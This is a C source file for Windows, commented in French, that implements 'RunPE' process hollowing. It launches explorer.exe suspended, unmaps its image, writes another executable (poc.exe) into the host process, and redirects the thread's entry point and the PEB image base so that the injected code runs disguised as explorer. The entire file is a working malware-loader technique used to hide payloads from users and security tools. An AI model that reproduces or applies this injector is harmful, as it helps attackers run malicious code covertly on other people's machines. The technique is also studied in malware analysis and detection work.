#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

// gcc -O2 -s runpe.c -o runpe.exe

typedef struct _PE_file {
    DWORD size;
    LPVOID content;
} PE_file, *PPE_file;


int start_suspended_process(char *host_process, STARTUPINFO* si, PROCESS_INFORMATION* pi) {
    return  CreateProcess(
        host_process,       // nom de l'executable
        NULL,               // commande qui doit être exécutée
        NULL,               // Détermine si le nouveau handle peut être hérité par le process enfant
        NULL,               // Détermine si le nouveau handle peut être hérité par le Thread enfant
        FALSE,              // Héritage du handle du père
        CREATE_SUSPENDED,   // flag de création du process, ici pour avoir un process avec l'état suspendu au , mettre à 0 pour un état par défaut
        NULL,               // Variables d'environnements
        NULL,               // répertoire courant
        si,                 // paramètres d'initialisation du process
        pi                  // informations sur le process
    );
}


void RunPe(char* host_process, PPE_file p_PE_file) {
    int error = 0;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    PCONTEXT p_ctx_thread;

    // Parsing PE_file
    PIMAGE_DOS_HEADER p_DOS_header = (PIMAGE_DOS_HEADER)p_PE_file->content;
    PIMAGE_NT_HEADERS p_NT_header = (PIMAGE_NT_HEADERS)((DWORD)p_PE_file->content + p_DOS_header->e_lfanew);
    IMAGE_OPTIONAL_HEADER32 p_optional_header = (IMAGE_OPTIONAL_HEADER32)p_NT_header->OptionalHeader;

    DWORD ImageBase_host;
    LPVOID p_ImageBase_host;

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));

    if(start_suspended_process(host_process, &si, &pi)) {
        printf("[+] host process is starting\n");
        printf("[+] -> Process ID: %d\n", (unsigned int)pi.dwProcessId);
        printf("[+] -> Thread ID %d\n", (unsigned int)pi.dwThreadId);

        /*
            Allocation de mémoire puis récupération du Context du Thread dans le process lancé.
            Le Context du thread contient différentes comme le PEB et l'EntryPoint du process.
            Le PEB va permettre de récupérer l'ImageBase, c'est là ou chargé l'exécutable en mémoire.
        */
        p_ctx_thread = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
        p_ctx_thread->ContextFlags = CONTEXT_FULL;

        if(p_ctx_thread != NULL) {
            if(GetThreadContext(pi.hThread, (LPCONTEXT)p_ctx_thread)) {
                printf("[+] GetThreadContext OK\n");
            }
            else {
                printf("[+] ERROR GetThreadContext \n");
                error = 1;
                goto error;
            }
        }
        else {
            printf("[!] ERROR VirtualAlloc for context\n");
            error = 1;
            goto error;
        }

        printf("[+] -> Host ImageBase addr (EBX+0x8) : 0x%08X\n", (unsigned int)(p_ctx_thread->Ebx + 8));
        printf("[+] -> Host EntryPoint (Eax) : 0x%08X\n", (unsigned int)p_ctx_thread->Eax);


        // lit le contenu du PEB pour récupérer l'addresse de l'ImageBase du process lancé
        if(ReadProcessMemory(pi.hProcess, (LPCVOID)(p_ctx_thread->Ebx + 8), &ImageBase_host, sizeof(DWORD), NULL)) {
            printf("[+] ReadProcessMemory ImageBase host OK \n");
        }
        else {
            printf("[+] ERROR ReadProcessMemory ImageBase host\n");
            error = 1;
            goto error;
        }

        printf("[+] -> host ImageBase: 0x%p\n", ImageBase_host);
        printf("[+] inject ImageBase: 0x%p\n", p_optional_header.ImageBase);

        /*
            On vérifie que les addresses des deux images ne sont pas les mêmes
            Si c'est la même on démappe l'image du processus lancé
            pour se faire on utilise une fonction non documenté qui est NtUnmapViewOfSection
        */
        if((LPVOID)ImageBase_host == (LPVOID)p_optional_header.ImageBase) {
            typedef DWORD (WINAPI* p_NtUnmapViewOfSection)(HANDLE, PVOID);
            HMODULE hMod = GetModuleHandle("ntdll.dll");
            p_NtUnmapViewOfSection _NtUnmapViewOfSection = (p_NtUnmapViewOfSection)GetProcAddress(hMod, "NtUnmapViewOfSection");
            if(0 != _NtUnmapViewOfSection(pi.hProcess, p_ImageBase_host)) {
                printf("[+] UnmapViewOfSection OK\n");
            }
            else {
                printf("[!] ERROR: UnmapViewOfSection problem\n");
                error = 1;
                goto error;
            }
        }
    
        // Allocation de mémoire à l'adresse de l'ImageBase du process pour pouvoir y écrire
        p_ImageBase_host = VirtualAllocEx(pi.hProcess, (LPVOID)p_optional_header.ImageBase,
                p_optional_header.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        if(p_ImageBase_host != NULL) {
            printf("[+] Allocation to addr 0x%p in host process\n", p_optional_header.ImageBase);
            printf("[+] -> Size of allocation: %08X\n", (unsigned int)p_optional_header.SizeOfImage);


            // Ecriture du header
            if(WriteProcessMemory(pi.hProcess, p_ImageBase_host, p_PE_file->content , p_optional_header.SizeOfHeaders, NULL)) {
                printf("[+] Write header in memory OK\n");
            }
            else {
                printf("[!] Failed to write header in memory\n");
                error = 1;
                goto error;
            }

            // Ecriture des sections
            printf("[+] Number of sections to write: %d\n", (unsigned int)p_NT_header->FileHeader.NumberOfSections);
            for(int i = 0; i < p_NT_header->FileHeader.NumberOfSections ;i++) {
                /*
                    la section header se trouve juste après le NT header.
                    calculs: addresse NT header + la taille d'un NT header
                        premiere sections  = addresse NT header + la taille d'un NT header
                        section suivante: ajouter la taille d'une section header.
                */
                PIMAGE_SECTION_HEADER p_section_header = (PIMAGE_SECTION_HEADER)((DWORD)p_NT_header + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
                printf("[+] -> section to write %s : ", p_section_header->Name);
                if(WriteProcessMemory(
                    pi.hProcess,
                    p_ImageBase_host + p_section_header->VirtualAddress,
                    (LPCVOID)(p_PE_file->content + p_section_header->PointerToRawData),
                    p_section_header->SizeOfRawData,
                    NULL
                )) {
                    printf("OK\n");
                }
                else {
                    printf("NOK\n");
                }
            }
        }
        else {
            printf("[!] Failed to allocate in memory addr 0x%08X\n", (unsigned int)p_optional_header.ImageBase);
            error = 1;
            goto error;
        }

        // Changement d'adresse du PEB
        if(WriteProcessMemory(pi.hProcess, (LPVOID)(p_ctx_thread->Ebx+8), (LPCVOID)&p_optional_header.ImageBase, 4, NULL))
        {
            printf("[+] New ImageBase addr (EBX+0x8) : 0x%08X\n", (unsigned int)(p_ctx_thread->Ebx + 8));
        }
        else {
            printf("[!] ERROR set new ImageBase\n");
            error = 1;
            goto error;
        }

        // modification de l'EntryPoint
        p_ctx_thread->Eax = (DWORD)p_ImageBase_host + p_optional_header.AddressOfEntryPoint;
        printf("[+] New EntryPoint (Eax) : 0x%08X\n", (unsigned int)p_ctx_thread->Eax);

        // on set le nouveau context
        if(SetThreadContext(pi.hThread, p_ctx_thread)){
            printf("[+] Set new context OK\n");
        }
        else {
            printf("[!] ERROR set new context\n");
            error =1;
            goto error;
        }

        // on relance le Thread
        if(ResumeThread(pi.hThread) != -1) {
            printf("[+] ResumeThread OK\n");
        }
        else {
            printf("[!] ERROR ResumeThread\n");
            error = 1;
            goto error;
        }
    }
    else {
        printf("[!] ERROR starting host process\n");
        error = 1;
        goto error;
    }

    error:
        if(error != 0){
            LPTSTR errorText;
            printf("[?] Error code: %d\n", (int)GetLastError());
            FormatMessage(
                (FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_ALLOCATE_BUFFER),
                NULL,
                GetLastError(),
                MAKELANGID(LANG_NEUTRAL, SUBLANG_SYS_DEFAULT),
                (LPTSTR)&errorText,
                0,
                NULL
            );
            if(errorText != NULL) {
                printf("[?] Error information: %s\n", errorText);
            }
            else {
                printf("[?] No Error information found");
            }

            if(TerminateProcess(pi.hProcess, 0)) {
                printf("[+] Process Kill \n");
            }
            if(p_PE_file->content != NULL) {
                if(VirtualFree((LPVOID)p_PE_file->content, sizeof(p_PE_file->size), MEM_DECOMMIT)) {
                    printf("[+] PE buffer free\n");
                }
            }
            if(p_PE_file != NULL) {
                free(p_PE_file);
                printf("[+] struture PPE_file free\n");
            }
        }

    if (pi.hProcess != NULL) {
        CloseHandle(pi.hProcess);
    }
    if(pi.hThread != NULL) {
        CloseHandle(pi.hThread);
    }
    if(p_ctx_thread != NULL) {
        VirtualFree((LPVOID)p_ctx_thread, sizeof(CONTEXT), MEM_DECOMMIT);
    }

}


PPE_file get_source_PE(char *path_exe) {
    HANDLE h_file;
    DWORD file_size;
    LPVOID PE_buffer;
    DWORD lpNumberOfBytesRead;

    h_file = CreateFile(path_exe, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
    if(h_file != INVALID_HANDLE_VALUE) {
        file_size = GetFileSize(h_file, NULL);
        PE_buffer = VirtualAlloc(NULL, file_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
        if(ReadFile(h_file, PE_buffer, file_size, &lpNumberOfBytesRead, NULL) == 0) {
            printf("[!] ERROR read binary file:\n");
            printf("[?] code error %d\n", (int)GetLastError());
        }
    }
    else {
        printf("[!] ERROR open binary file\n");
        printf("[?] code error %d\n", (int)GetLastError());
    }

    PPE_file p_PE_file = (PPE_file)malloc(sizeof(PE_file));
    p_PE_file->size = file_size;
    p_PE_file->content = PE_buffer;

    CloseHandle(h_file);
    return p_PE_file;
}


int main() {
    PPE_file p_PE_file = get_source_PE("poc.exe");
    RunPe("C:\\Windows\\SysWOW64\\explorer.exe", p_PE_file);
    return 0;
}
